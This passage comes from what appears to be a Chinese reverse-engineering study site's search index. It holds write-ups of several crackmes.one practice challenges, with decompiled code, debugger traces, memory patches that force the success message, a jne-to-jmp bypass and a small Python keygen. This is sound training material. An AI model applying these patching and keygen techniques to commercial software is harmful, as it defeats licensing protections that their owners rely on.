at 4018CB .text:00401A2F ; } // starts at 4018CB .text:00401A2F decode endp \u6765\u5c1d\u8bd5\u4e00\u4e9bbypass\u7684\u529e\u6cd5\uff0c\u800c\u4e0d\u76f4\u63a5\u9762\u5bf9\u52a0\u5bc6\u7b97\u6cd5 \u627e\u5230\u8c03\u7528\u52a0\u5bc6\u5b57\u7b26\u4e32\u7684\u5730\u65b9\u4e0b\u65ad\u70b9 \u5c1d\u8bd5\u5c060x49A024\u4fee\u6539\u4e3a0x49A028\uff0c\u770b\u5230\u7a0b\u5e8f\u8fd4\u56de\u63d0\u793a\u53d8\u6210\u4e86\u6b63\u786e\u7684\u63d0\u793a \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u5730\u5740\u662f\u6808\u4e0a\u7684\u5f15\u7528\u5730\u5740\uff0c\u539f\u59cb\u5b57\u7b26\u4e32\u5b58\u50a8\u4f4d\u7f6e\u4e0d\u662f\u8fd9\u4e2a\u5730\u5740 0x49A02C \u672a\u77e5\u5b57\u7b26\u4e32 &\"49 98 162 128 250 288 392 256 450 570 539 384 676 756 780 512 901 882 912 640 1134 1144 1288 768 1350 1430 1539 896 1624 1500 1612 1024 1881 1768 1855 1152 1813 1862 2067 1920 1312 2058 2150 2376 2385 1472 2303 2496 2352 2600 1632 2548 2756 3078 2915 1792 3135 2842 3068\" 0x49A028 \u6210\u529f\u63d0\u793a\u7684\u5b57\u7b26\u4e32 congratulations! you did it successfully! &\"99 222 330 412 570 582 812 936 972 970 1276 1260 1443 1540 1725 528 544 2178 2109 2340 672 2200 2415 2400 800 2730 3132 896 3335 3510 3069 3168 3333 3910 4025 3672 4329 4104 4212 4840 1353\" 0x49A024 \u5931\u8d25\u63d0\u793a\u7684\u5b57\u7b26\u4e32 You made a mistake. Try again!! &\"89 222 351 128 545 582 700 808 288 970 352 1308 1365 1610 1740 1552 1819 1818 874 640 1764 2508 2783 768 2425 2678 2619 2940 3190 990 1023\" 0x49A020 pause\u5b57\u7b26\u4e32 &\"112 194 351 460 505\" \u6211\u60f3\u77e5\u90530x49A02C\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\uff0c\u5f53\u66ff\u6362\u4e3a0x49A02C\u65f6\uff0c\u8f93\u51fa\u7684\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f3c\u4e4e\u8fd8\u6709\u4e00\u5c42\u52a0\u5bc6 116 208 291 464 510 648 679 824 945 1150 1265 1404 1495 714 \u5b9a\u4f4d\u5230\u5b58\u50a8\u6570\u636e\u7684\u539f\u59cb\u5730\u5740\u3002 \u540c\u6837\u641c\u7d22\u5b57\u7b26\u4e32\u53ef\u4ee5\u770b\u5230\uff0c\u6ca1\u6709&\u7684\u8868\u793a\u539f\u59cb\u6570\u636e\uff0c\u8ddf\u8e2a\u5230\u5185\u5b58\u5c31\u53ef\u4ee5\u627e\u5230\u539f\u59cb\u5730\u5740 \u5c06\u8fd9\u6bb5\u6570\u636e\u66ff\u6362\u9519\u8bef\u63d0\u793a\u7684\u6570\u636e\u3002 \u5728\u7a0b\u5e8f\u5165\u53e3\u65ad\u70b9\u65f6\u4fee\u6539\u5185\u5b58\u6570\u636e\uff0c\u518d\u8fd0\u884c\u3002 \u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5b57\u7b26\u4e32\u4e8c\u6b21\u89e3\u5bc6\u4e3a\u4e86 thatflagissus3 \u8fd9\u5c31\u662f\u5bc6\u7801","title":"Crackmes.one\u7ec3\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#zun1-crackme","text":"\u7a0b\u5e8f\u529f\u80fd \u6253\u5f00\u540e\u63d0\u793a\u8f93\u5165\u8d26\u53f7\u5bc6\u7801 \u52a8\u6001 \u5b9a\u4f4d\u5230\u62a5\u9519\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u524d\u6709\u4e00\u4e2a\u51fd\u6570\u5224\u65ad\uff0c\u4e0b\u4e2a\u65ad\u70b9\u770b\u770b jne\u4e86\u4e00\u4e2a\u51fd\u6570\uff0cjne\u662f\u5224\u65adZF\u662f\u5426\u7b49\u4e8e1\uff0c\u4e3a0\u65f6\u8df3\u8f6c \u7528\u6237\u540d\u968f\u4fbf\u8f93\u4e86123123\uff0czf\u4e3a0\u4e86\u3002\u8fd9\u65f6rsp\u4e3a123123\uff0c123123\u88ab\u538b\u5165\u4e86\u6808\u9876\uff0c\u4f46\u662frcx\u662f\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\u662f234234\uff1f \u5176\u5b9e\u6b64\u65f6\u53ef\u4ee5\u731c\u5230234234\u662f\u5bc6\u7801\uff0c\u8bd5\u4e86\u4e00\u4e0b\u786e\u5b9e\u662f\u5bc6\u7801\u3002\u5bc6\u7801\u5c31\u662f\u6839\u636e\u7528\u6237\u540d\u6309\u5b57\u7b26\u52a01\u3002 \u4ed4\u7ec6\u770b\u770b\u8fd9\u4e2a\u7a0b\u5e8f\u6d41\u7a0b call crackme.4010F8 cmp eax,0x0 jne crackme.401249 crackme.401249 \u662f\u5224\u65ad\uff0c\u90a3\u4e48crackme.4010F8\u51fd\u6570\u53ef\u80fd\u5c31\u662f\u5bc6\u7801\u751f\u6210\u7684\u903b\u8f91\u3002 crackme.4010F8\u8be6\u60c5\u5982\u4e0b push rbp mov rbp,rsp sub rsp,0x20 //\u51fd\u6570\u5e8f\u8a00 mov qword ptr ss:[rbp+0x10],rcx mov qword ptr ss:[rbp+0x18],rdx //fastcall\u4e2drcx\u548crdx\u662f\u4f20\u5165\u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f\u7528\u6237\u540d\u4e00\u4e2a\u662f\u5bc6\u7801\uff0c\u5168\u538b\u6808\u4e86 mov rax,qword ptr ss:[rbp+0x10] mov r10,rax mov rcx,r10 //\u7528\u6237\u540d\u4e00\u5c42\u5c42\u6700\u540e\u7ed9\u4e86rcx call crackme.401048 //\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u8fd9\u5e94\u8be5\u662f\u8ba1\u7b97\u5bc6\u7801\u7684\u51fd\u6570 mov rcx,qword ptr ss:[rbp+0x18] //\u7b97\u5b8c\u540e\u628a\u5bc6\u7801\u8d4b\u7ed9\u4e86rcx mov r11,rcx mov r10,rax mov rcx,r10 mov rdx,r11 //\u7528\u6237\u540d\u7ed9\u4e86rcx\uff0c\u5bc6\u7801\u7ed9\u4e86rdx call <JMP.&strcmp> //strcmp\u5b57\u7b26\u4e32\u6bd4\u8f83\u51fd\u6570 cmp eax,0x0 jne crackme.401142 mov eax,0x0 jmp crackme.401147 mov eax,0x1 leave ret \u8be6\u7ec6\u770b\u770bcrackme.401048\u4e2d\u5bc6\u7801\u600e\u4e48\u7b97\u7684 push rbp mov rbp,rsp sub rsp,0x30 //\u51fd\u6570\u5e8f\u8a00 mov qword ptr ss:[rbp+0x10],rcx mov rax,qword ptr ss:[rbp+0x10] mov r8,rax //\u7528\u6237\u540d\u7ed9\u4e86[rbp+0x10]\u3001rax\u3001r8 mov eax,0x20 //eax\u4e3a0x20 mov r11,rax //r11\u4e3a\u7528\u6237\u540d lea rax,qword ptr ds:[0x402220] //\u7ed9\u4e86rax\u4e00\u4e2a\u5730\u57400x402220 mov r10,rax mov rcx,r10 mov rdx,r11 //rcx\u662f\u5730\u57400x402220\uff0crdx\u662f\u7528\u6237\u540d call <JMP.&strcpy_s> //\u8c03\u7528strcpy_s\u51fd\u6570\u590d\u5236\u5b57\u7b26\u4e32\u3002\u7528\u6237\u540d\u590d\u5236\u5230\u4e86[0x402220] cmp eax,0x0 // \u7f6e0 je crackme.401096 // \u8df3\u8f6c\u4e86 lea rax,qword ptr ds:[0x402004] mov r10,rax mov rcx,r10 call crackme.401000 //strcpy_s\u9519\u8bef\u65f6\u7684\u5224\u65ad mov eax,0x0 //crackme.401096\u8df3\u5230\u8fd9\u91cc\u4e86 mov dword ptr ss:[rbp-0x4],eax //eax\u5206\u914d\u7ed9\u4e86rbp-0x4 lea rax,qword ptr ds:[0x402220] //\u7ed9\u4e86rax\u4e00\u4e2a\u5730\u57400x402220\uff0c\u4e5f\u5c31\u662f\u7528\u6237\u540d\u7684\u5730\u5740 mov r10,rax mov rcx,r10 //\u6700\u540e\u7ed9\u4e86rcx call <JMP.&strlen> //strlen\u8ba1\u7b97rcx\u957f\u5ea6\uff0c\u8ba1\u7b97\u7528\u6237\u540d\u957f\u5ea6,\u8fd4\u56de\u503c\u4ecerax\u4f20\u51fa mov ecx,dword ptr ss:[rbp-0x4] movsxd rcx,ecx //ecx\u6269\u5c55\u5230rcx\uff0crcx\u4e3a0\u4e86 cmp rcx,rax //\u6bd4\u8f83\u7528\u6237\u540d\u957f\u5ea6\u662f\u4e0d\u662f0\uff0c\u5bf9\u6807\u5fd7\u4f4d\u4ea7\u751f\u5f71\u54cd \u7b2c\u4e00\u6b21\u5faa\u73af\uff0crcx\u53d8\u4e3a223 \u7b2c\u4e8c\u6b21\u5faa\u73af \u7b2c\u4e09\u6b21\u5faa\u73af........ \u5faa\u73af\u4f53\u4e2d\u7528\u5730\u57400x402220\u5b58\u50a8\u8ba1\u7b97\u7684\u503c\uff0c\u7528\u4ee5\u4e0b\u6307\u4ee4 lea rcx,qword ptr ds:[0x402220] add rcx,rax movsx eax,byte ptr ds:[rcx] ... add eax,0x1 \u6765\u9010\u5b57\u8282\u5730\u8fdb\u884c\u52a01\u3002 \u5de7\u5999\u5730\u5c06\u5730\u5740\u8d4b\u7ed9\u5bc4\u5b58\u5668\u540e\u52a0\u4e0a1\uff0c\u4ece\u800c\u5b9e\u73b0\u9010\u5b57\u8282\u7684\u529f\u80fd\u3002 \u600e\u4e48\u5b9e\u73b0\u7684\uff1f \u6bd4\u5982\u8bf4 [0x402220] \u7684\u5730\u5740\u6307\u5411 0x313233\u7684\u503c\u3002\u5730\u5740\u52a01\u540e\u53d8\u6210\u4e86[0x402221]\uff0c0x313233\u53d8\u6210\u4e860x323300\u3002\u5c31\u662f\u8bf4\u5c06\u7b2c\u4e00\u4e2a\u5b57\u8282\u79fb\u9664\u4e86 \u7528\u6237\u540d\u957f\u5ea6\u5c31\u662f\u5faa\u73af\u6b21\u6570\uff0c\u5faa\u73af\u5b8c\u6210\u540e\uff0c\u628a\u503c\u4f20\u7ed9rax\u3002 \u63a5\u7740\u4f7f\u7528strcmp\u6765\u6bd4\u8f83\u8ba1\u7b97\u524d\u548c\u8ba1\u7b97\u540e\u7684\u503c 000000000040111A | 48:8B4D 18 | mov rcx,qword ptr ss:[rbp+0x18] | \u63d0\u53d6rbp+0x18\u7684\u503c\u5230rcx\uff0c\u5c31\u662f\u539f\u59cb\u7528\u6237\u540d 000000000040111E | 49:89CB | mov r11,rcx | rcx:\"234\" 0000000000401121 | 49:89C2 | mov r10,rax | r10:\"234\" 0000000000401124 | 4C:89D1 | mov rcx,r10 | rcx:\"234\", r10:\"234\" 0000000000401127 | 4C:89DA | mov rdx,r11 | 000000000040112A | E8 B1020000 | call <JMP.&strcmp> | \u6bd4\u8f83rcx\u548crdx\uff0c\u539f\u59cb\u7528\u6237\u540d\u548c\u8ba1\u7b97\u540e\u7684\u503c \u76f8\u540c\u65f6rax\u4e3a0\uff0c\u4e0d\u540c\u65f6rax\u4e3a1\uff0c\u63a5\u7740\u5c06eax\u4e0e0\u6bd4\u8f83\uff0c\u5f39\u51fa\u54cd\u5e94\u7684\u63d0\u793a\u3002 \u4fee\u6539\u6700\u540e\u7684rax\u503c\u53ef\u4ee5\u5f3a\u5236\u6b63\u786e\u3002 \u9759\u6001 \u5165\u53e3\u51fd\u6570 void __noreturn start() { int v0; // eax int v1; // [rsp+4Ch] [rbp-4h] BYREF v1 = 0; _set_app_type(_crt_console_app); //\u8bbe\u7f6e\u7a0b\u5e8f\u7684\u542f\u52a8\u6a21\u5f0f\uff0cconsole\u6216gui controlfp(0x10000u, 0x30000u); //\u8bbe\u7f6e\u6d6e\u70b9\u6570\u7684\u63a7\u5236\u6a21\u5f0f _getmainargs(*(_QWORD *)&_argc, _argv, environ, (unsigned int)dword_402240, &v1); // \u83b7\u53d6\u53c2\u6570\u548c\u73af\u5883\u53d8\u91cf v0 = sub_401149((unsigned int)_argc, _argv, environ); exit(v0); } \u90a3\u4e48 sub_401149 \u51fd\u6570\u5c31\u662f\u4e3b\u51fd\u6570\u4e86\uff0c\u53cd\u7f16\u8bd1\u5982\u4e0b __int64 sub_401149() { FILE *v0; // rax \u6587\u4ef6\u7ed3\u6784\u4f53\u6307\u9488 FILE *v1; // rax \u6587\u4ef6\u7ed3\u6784\u4f53\u6307\u9488 char Str[32]; // [rsp+20h] [rbp-40h] BYREF char Buffer[32]; // [rsp+40h] [rbp-20h] BYREF printf(\"type in the username: \"); v0 = _iob_func(); fgets(Buffer, 32, v0); //\u4ece\u8f93\u5165\u4e2d\u8bfb\u53d6\uff0c\u5e76\u5b58\u50a8\u5230Buffer Buffer[strcspn(Buffer, Control)] = 0; //\u622a\u65ad\u5b57\u7b26\u4ee5\\0 printf(\"type in the password: \"); v1 = _iob_func(); fgets(Str, 32, v1); Str[strcspn(Str, asc_402045)] = 0; //\u540c\u4e0a if ( (unsigned int)sub_4010F8(Buffer, Str) ) printf(\"wrong!\"); else printf(\"correct!\"); return 0i64; } \u7a0b\u5e8f\u7684\u903b\u8f91\u5224\u65ad\u5728 sub_4010F8 \u51fd\u6570\u4e2d\uff0c\u4f20\u5165\u4e86Buffer(\u7528\u6237\u540d)\u548cStr(\u5bc6\u7801)\u53cd\u7f16\u8bd1\u5982\u4e0b _BOOL8 __fastcall sub_4010F8(__int64 a1, const char *a2) { const char *v2; // rax v2 = (const char *)sub_401048(a1); return strcmp(v2, a2) != 0; } \u4e00\u4e2abool\u7c7b\u578b\u51fd\u6570\uff0c\u63a5\u53d72\u4e2a\u53c2\u6570\u3002\u628a\u7ecf\u8fc7 sub_401048 \u51fd\u6570\u8ba1\u7b97\u7684a1(\u7528\u6237\u540d)\u8d4b\u7ed9\u4e86v2\uff0c\u7136\u540e\u6309\u5b57\u7b26\u4e32\u6bd4\u8f83v2\u548ca2\u662f\u5426\u4e3a0\u3002\u76f8\u540c\u65f6\u8fd4\u56defalse\uff0c\u4e0d\u540c\u8fd4\u56detrue\u3002 \u90a3 sub_401048 \u5c31\u662f\u8ba1\u7b97\u5bc6\u7801\u7684\u51fd\u6570\u4e86\u3002 char *__fastcall sub_401048(const char *a1) { int i; // [rsp+2Ch] [rbp-4h] if ( strcpy_s(Str, 0x20ui64, a1) ) //\u7528\u6237\u540d\u590d\u5236\u5230str\uff0c\u590d\u5236\u6210\u529f\u65f6 sub_401000(aStrcpySFailed); for ( i = 0; i < strlen(Str); ++i ) ++Str[i]; return Str; } \u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u65b0\u51fd\u6570 sub_401000 \uff0c\u770b\u8d77\u6765\u5c31\u662f\u8f93\u51fa\u7528\u6237\u540d\uff0c\u7136\u540e\u9000\u51fa\u7a0b\u5e8f\u3002 \u5f53 strcpy_s \u590d\u5236\u5931\u8d25\u65f6\u4f1a\u8fd4\u56de\u975e0\u503c\uff0c\u4ece\u800c\u8fdb\u5165if\u4f53\u6267\u884c sub_401000 \u3002\u6b63\u5e38\u60c5\u51b5\u662f\u4e0d\u4f1a\u8fdb\u5165if\u7684\u3002 void __fastcall __noreturn sub_401000(const char *a1) { printf(\"%s\\n\", a1); exit(1); } \u63a5\u4e0b\u6765\u662f\u4e00\u4e2afor\u5faa\u73af\uff0c\u6839\u636estr\u7684\u957f\u5ea6\u6765\u5b9a\u4e49\u5faa\u73af\u6b21\u6570\uff0c\u6bcf\u6b21\u5faa\u73af\u90fd\u4f1a\u5c06str\u6570\u7ec4\u4e2d\u7684\u76f8\u5e94\u5143\u7d20\u8fdb\u884c+1\uff0c\u6700\u540e\u8fd4\u56deStr\u3002\u90a3\u4e48\u8fd9\u5c31\u662f\u5bc6\u7801\u7684\u4ea7\u751f\u65b9\u5f0f\u4e86 \u5bc6\u7801\u751f\u6210\u5668 username = input(\"username\uff1a\") password = \"\" for char in username: encrypted_char = chr(ord(char) + 1) password += encrypted_char print(\"password\uff1a\", password)","title":"zun1 crackme"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#metamorphic-crackme","text":"\u6253\u5f00\u7a0b\u5e8f\u8981\u6c42\u8f93\u5165key \u901a\u8fc7\u63d0\u793a\u7684\u5b57\u7b26\u4e32\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5230\u5224\u65ad\u7684\u5730\u65b9\uff0cjne\u5224\u65ad\u4e86test eax,eax\u7684\u7ed3\u679c\u3002\u4f46\u662ftest\u81ea\u8eab\u4e0d\u5c31\u662f\u6c38\u8fdc\u7b49\u4e8e\u5417? \u53ef\u4ee5\u5c06jne\u4fee\u6539\u4e3ajmp\u4f7f\u5176\u6c38\u8fdc\u8df3\u8f6c\u5230Success. \u4f46\u4f5c\u8005\u8ba9\u5199\u51fa\u4e00\u4e2a\u6ce8\u518c\u673a,\u6240\u4ee5\u4f9d\u65e7\u9700\u8981\u5206\u6790\u7a0b\u5e8f\u7684\u903b\u8f91\u3002 \u8fd9\u4e2a\u7a0b\u5e8f\u7528\u7684\u51fd\u6570\u6709\u70b9\u591a,\u5148\u770b\u770b\u53cd\u6c47\u7f16\u770b\u770b\u4ee3\u7801 \u5165\u53e3\u70b9\u51fd\u6570\u4f7f\u7528\u8fd4\u56de\u7684\u65b9\u5f0f\u52a0\u8f7d\u4e86\u51fd\u6570 sub_140001154() __int64 start() { unk_14002A0E0 = 0; return (unsigned int)sub_140001154(); } \u8fd9\u4e2a\u51fd\u6570 int __fastcall main(int argc, const char **argv, const char **envp) { PVOID v3; // rcx signed __int64 *v4; // rdx __int64 v5; // rdx __int64 v6; // rcx __int64 v7; // r8 __int64 v8; // r9 __int64 v10; // [rsp+20h] [rbp-50h] PVOID StackBase; // [rsp+58h] [rbp-18h] signed __int64 v12; // [rsp+60h] [rbp-10h] int v13; // [rsp+6Ch] [rbp-4h] StackBase = NtCurrentTeb()->NtTib.StackBase; //\u83b7\u53d6\u6808\u57fa\u5740 v13 = 0; while ( 1 ) { v3 = StackBase; //\u6808\u57fa\u5740\u7ed9\u4e86v3 v4 = &qword_14002ABB8; v12 = _InterlockedCompareExchange64(&qword_14002ABB8, (signed __int64)StackBase, 0i64); //\u786e\u4fdd\u57fa\u5740\u4e3aStackBase if ( !v12 ) break; if ( (PVOID)v12 == StackBase ) { v13 = 1; break; } Sleep(0x3E8u); //sleep 1000 } if ( unk_14002ABB0 == 1 ) sub_140011F70(31i64); if ( unk_14002ABB0 ) { dword_14002A024 = 1; } else { unk_14002ABB0 = 1; initterm(&qword_14002C018, qword_14002C028); } if ( unk_14002ABB0 == 1 ) { initterm(&qword_14002C000, &qword_14002C010); unk_14002ABB0 = 2; } //\u4e0a\u9762\u90fd\u662f\u5173\u4e8eIO\u6d41\u7684 if ( !v13 ) { v10 = 0i64; v4 = (signed __int64 *)_InterlockedExchange64(&qword_14002ABB8, 0i64); } //\u8fd9\u91cc\u7684\u5224\u65ad\u53ea\u67092\u4e2a\u53c2\u6570\uff0c\u5c06qword_14002ABB8\u66ff\u6362\u4e3a\u4e860i64\uff0c\u5e76\u4e14v4\u662fqword_14002ABB8\u539f\u59cb\u503c if ( TlsCallback_0 ) TlsCallback_0(0i64, 2i64, 0i64); //\u8bbe\u7f6e\u4e86TLScallback sub_140002FD8(v3, v4); qword_14002A120 = (__int64)SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)&loc_140003120); set_invalid_parameter_handler(Handler); sub_1400027D0(v6, v5, v7, v8, v10); sub_14000147C((unsigned int)dword_14002A004, &qword_14002A008); sub_140002567(); *(_QWORD *)off_140023120 = qword_14002A010; Code = sub_1400122A0((unsigned int)dword_14002A004, qword_14002A008, qword_14002A010); if ( !dword_14002A020 ) exit(Code); if ( !dword_14002A024 ) cexit(); return Code; } \u78b0\u5230\u4e00\u4e2a\u51fd\u6570 if ( unk_14002ABB0 == 1 ) sub_140011F70(31i64); void __fastcall __noreturn sub_140011F70(unsigned int a1) { FILE *v1; // rax v1 = _acrt_iob_func(2u); sub_140011DB0(v1, \"runtime error %d\\n\", a1); exit(255); } __int64 sub_140011DB0(FILE *a1, const char *a2, ...) { va_list va; // [rsp+60h] [rbp+20h] BYREF va_start(va, a2); return (unsigned int)_stdio_common_vfprintf(0i64, a1, a2, 0i64, va); } \u5927\u6982\u662f\u5224\u65adIO\u6d41\u7684\u4ee3\u7801\u3002 __int64 sub_140002FD8() { __int64 result; // rax void *v1; // rsp char v2; // [rsp+20h] [rbp-10h] BYREF int v3; // [rsp+2Ch] [rbp-4h] result = (unsigned int)dword_14002A0FC; if ( !dword_14002A0FC ) { dword_14002A0FC = 1; v3 = sub_14000387B(); v1 = alloca(sub_140003B00()); //\u5206\u914d\u6808\u7a7a\u95f4\uff0c4k\u5bf9\u9f50 qword_14002A0F0 = (__int64)&v2; dword_14002A0F8 = 0; sub_140002C4E(&unk_1400263F0, &unk_1400263F0, off_1400251F0); return sub_140002B2F(); } return result; } __int64 sub_14000387B() { if ( (unsigned int)sub_140003650(off_1400251F0) ) return *(unsigned __int16 *)((char *)off_1400251F0 + *((int *)off_1400251F0 + 15) + 6); else return 0i64; } _BOOL8 __fastcall sub_140003650(__int64 a1) { __int64 v2; // [rsp+10h] [rbp-10h] if ( *(_WORD *)a1 != 23117 ) return 0i64; v2 = *(int *)(a1 + 60) + a1; //v2\u7b49\u4e8e23117+60+23117 = 46294 return *(_DWORD *)v2 == 17744 && *(_WORD *)(v2 + 24) == 523; } \u5173\u952e\u51fd\u6570 __int64 sub_1400122A0() { __int64 v1[3]; // [rsp+20h] [rbp-D8h] BYREF __int64 v2; // [rsp+38h] [rbp-C0h] BYREF char v3[184]; // [rsp+40h] [rbp-B8h] BYREF sub_140002567(); printf(\"Input Key:\\n\"); v1[1] = 0xFFEEDDCCBBAA9988ui64; v1[0] = 0x7766554433221100i64; sub_140001C70(v1, v3); sub_140001720(\"%llu\", &v2); if ( (unsigned int)sub_140001760(v3, v2) ) printf(\"Success!\\n\"); else printf(\"Fail\\n\"); return 0i64; } \u7528\u4e8e\u5224\u65ad\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u4e86\u4e00\u4e2a\u5730\u5740 __int64 __fastcall sub_140001760(__int64 a1, __int64 a2) { char *v4; // rbx __int64 v5; // r13 char *v6; // rcx DWORD *v7; // rax __int64 (__fastcall *Address[60])(__int64, __int64); // [rsp+20h] [rbp-218h] BYREF char v10; // [rsp+200h] [rbp-38h] BYREF qmemcpy(Address, &unk_140024068, sizeof(Address)); v4 = (char *)Address; v5 = sub_1400024A0(); do { v6 = v4; v4 += 16; sub_140001B40(v6, a1); } while ( v4 != &v10 ); v7 = (DWORD *)malloc(8ui64); VirtualProtect(Address, 0x1E0ui64, 0x40u, v7); return Address[0](a2 ^ 0x11223344332211i64, v5); } \u8fd9\u4e2a\u52a0\u5bc6\u7a0b\u5e8f\u4ece\u5934\u5230\u5c3e\u90fd\u662f\u62ff\u5730\u5740\u8fdb\u884c\u8ba1\u7b97\uff0c\u4e14\u4f3c\u4e4e\u6709\u4e00\u4e2a\u5bc6\u94a5\u81ea\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7b97\u6cd5\u7528\u4e8e\u52a0\u5bc6\u3002 \u8fd9\u9898\u5bf9\u4e8e\u4e00\u4e2a\u521d\u5b66\u8005\u800c\u8a00\u4f3c\u4e4e\u6709\u4e9b\u8d85\u7eb2\u3002 \u5728https://github.com/forentfraps/metamorphic-crackme/\u627e\u5230\u4e86\u7591\u4f3c\u7684\u6e90\u4ee3\u7801","title":"Metamorphic crackme"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#objectivesquids-christmas-crackme","text":"\u7a0b\u5e8f\u754c\u9762 \u628a\u5bc6\u7801\u62ff\u51fa\u6765\u548c\u8f93\u5165\u6bd4\u8f83\u4e86\uff0c\u76f4\u63a5\u53ef\u4ee5\u770b\u5230\u660e\u6587\u5bc6\u7801 \u53cd\u6c47\u7f16\u770b\u6e90\u4ee3\u7801\u8fc7\u4e8e\u7b80\u5355 int __cdecl main(int argc, const char **argv, const char **envp) { char Str2[9]; // [esp+14h] [ebp-3Ch] BYREF char Str1[51]; // [esp+1Dh] [ebp-33h] BYREF __main(); strcpy(Str2, \"Santa123\"); puts(\"Please enter the secret password to open santas gift-vault:\"); scanf(\"%50s\", Str1); if ( !strcmp(Str1, Str2) ) puts(\"\\nHOORAY! You saved christmas, what a bad password! How could he have forgotten it??\"); else puts(\"\\nWrong key :(\\nBetter luck next time!\"); _getch(); return 0; }","title":"objectiveSquid's Christmas Crackme"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#hellokittyfan47s-hellokittyfans-crackme","text":"\u8fd9\u4e2a\u7a0b\u5e8f\u6ca1\u6709\u9519\u8bef\u63d0\u793a\uff0c\u627e\u5b57\u7b26\u4e32\u4e5f\u6ca1\u6709\u6b63\u786e\u63d0\u793a\u3002 \u4f5c\u8005\u8bf4\u6b63\u786e\u683c\u5f0f\u662f10\u4e2a\u6570\u5b57 int __fastcall main(int argc, const char **argv, const char **envp) { int *v3; // rax int *v4; // rbx const char *v5; // rdi int v6; // eax char *v7; // rcx char *EndPtr; // [rsp+20h] [rbp-48h] BYREF __int16 v10[4]; // [rsp+28h] [rbp-40h] BYREF char *String_input[2]; // [rsp+30h] [rbp-38h] BYREF __int64 v12; // [rsp+40h] [rbp-28h] unsigned __int64 v13; // [rsp+48h] [rbp-20h] *(_OWORD *)String_input = 0i64; v12 = 0i64; v13 = 15i64; LOBYTE(String_input[0]) = 0; do { do { print(std::cout, (__int64)\"Enter your key: \"); scanf(std::cin, String_input); } while ( !(unsigned __int8)sub_140001290((char *)String_input) ); v3 = errno(); v4 = v3; v5 = (const char *)String_input; if ( v13 >= 0x10 ) v5 = String_input[0]; *v3 = 0; v6 = strtol(v5, &EndPtr, 10); if ( v5 == EndPtr ) { std::_Xinvalid_argument(\"invalid stoi argument\"); JUMPOUT(0x1400014ACi64); } if ( *v4 == 34 ) { std::_Xout_of_range(\"stoi argument out of range\"); __debugbreak(); } } while ( ~(((2 * v6) >> 20) & 0xFFFFFF80 ^ 0x269A) != 9573 || !v6 ); LODWORD(EndPtr) = 1685024615; qmemcpy(v10, \"job\", 3); print(std::cout, (__int64)&EndPtr); print(std::cout, (__int64)v10); if ( v13 >= 0x10 ) { v7 = String_input[0]; if ( v13 + 1 >= 0x1000 ) { v7 = (char *)*((_QWORD *)String_input[0] - 1); if ( (unsigned __int64)(String_input[0] - v7 - 8) > 0x1F ) invalid_parameter_noinfo_noreturn(); } j_j_free(v7); } return 0; } sub_140001290\u51fd\u6570\uff0c\u662f\u4e00\u4e2a\u5224\u65ad\uff0c\u8ddf\u8fd0\u7b97\u903b\u8f91\u65e0\u5173 char __fastcall sub_140001290(char *String) { int *v2; // rax int *v3; // rdi char *EndPtr; // [rsp+20h] [rbp-28h] BYREF v2 = errno(); v3 = v2; if ( *((_QWORD *)String + 3) >= 0x10ui64 ) String = *(char **)String; *v2 = 0; strtol(String, &EndPtr, 10); if ( String == EndPtr ) std::_Xinvalid_argument(\"invalid stoi argument\"); if ( *v3 == 34 ) std::_Xout_of_range(\"stoi argument out of range\"); return 1; } loc_140001360 \u8fd9\u662fwhile\u5faa\u73af\u7684\u4e00\u90e8\u5206\uff0c\u8c03\u7528\u4e86sub_140001620\u3001sub_1400017F0\u548csub_140001290 \u51fd\u6570\uff0c\u8fd9\u90fd\u662f\u5bf9\u8f93\u5165\u7684\u68c0\u6d4b loc_140001360: lea rdx, aEnterYourKey ; \"Enter your key: \" mov rcx, cs:?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::basic_ostream<char,std::char_traits<char>> std::cout call sub_140001620 lea rdx, [rsp+68h+String] mov rcx, cs:?cin@std@@3V?$basic_istream@DU?$char_traits@D@std@@@1@A ; std::basic_istream<char,std::char_traits<char>> std::cin call sub_1400017F0 lea rcx, [rsp+68h+String] ; String call sub_140001290 test al, al jz short loc_140001360 \u7ee7\u7eed\u5f80\u4e0b\u53ef\u4ee5\u8ddf\u5230\u8fd9\u7247\u4ee3\u7801\uff0c\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0cecx\u548c2565h\u6bd4\u8f83\u540e\u6839\u636e\u8df3\u8f6c\u662f\u5426\u91cd\u56de\u5faa\u73af\u3002 lea ecx, [rax+rax] //\u76f8\u5f53\u4e8ex2 sar ecx, 14h //\u53f3\u79fb20\u4f4d and ecx, 0FFFFFF80h //\u4e0e0x0FFFFFF80 and\u8ba1\u7b97 xor ecx, 269Ah //\u4e0e0x269A xor\u8ba1\u7b97 not ecx //\u975e\u8ba1\u7b97 cmp ecx, 2565h jnz loc_140001360 \u6240\u4ee5\u53cd\u63a8\u5230\u539f\u59cb\u503c\u5c31\u662f\u6b63\u786e\u7684key\u3002 not 2565h \uff0c\u5f97\u52300xffffda9a 0xffffda9a xor 0x269A\uff0c\u5f97\u5230 0xfffffc00 \u8fd9\u91ccand\u5c31\u6709\u70b9\u9ebb\u70e6\u4e86\uff0c\u56e0\u4e3a\u539f\u59cb\u503c\u7684\u4f4e\u4f4d\u53ef\u80fd\u67091 0\u4f4d\u53ef\u80fd\u662f1\uff0c\u5728\u4e0e0x0FFFFFF80 and\u540e\u4e3a0\u3002 